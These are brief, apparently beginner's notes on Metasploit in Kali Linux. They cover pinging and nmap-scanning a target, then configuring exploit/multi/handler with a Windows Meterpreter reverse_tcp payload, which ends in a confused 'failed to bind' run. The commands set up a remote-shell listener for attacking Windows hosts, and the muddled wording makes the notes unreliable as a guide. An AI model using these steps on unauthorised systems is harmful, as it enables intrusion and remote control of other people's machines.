# Metaspolit
Handling in Kali Linux 
First
*Ping   [Ip Addr]*
and 
scan with nmap tool--->code 
*nmap -v -Pn [ip addr]*
*locate metasploit*
open msfconsole---> code
*use exploit/multi/handler*
*set payload windows/x64/meterpreter/reverse_tcp*
*show options*
Therefore the LHOST is missing from show options then the code will be -->
*set LHOST [Ip Addr]*
*show options*
When we set LHOST ip addr in payload it appears on payload when type code of show options in msfconsole and then we run the payload which is written in msfconsole
----code----
*run*
Therefore it is running but it says 
"Handler failed to bind to [ip addr] 
"Started reverse TCP handler on ....."
it running but failed to show it cannot be showen what has run it only runs infinity 
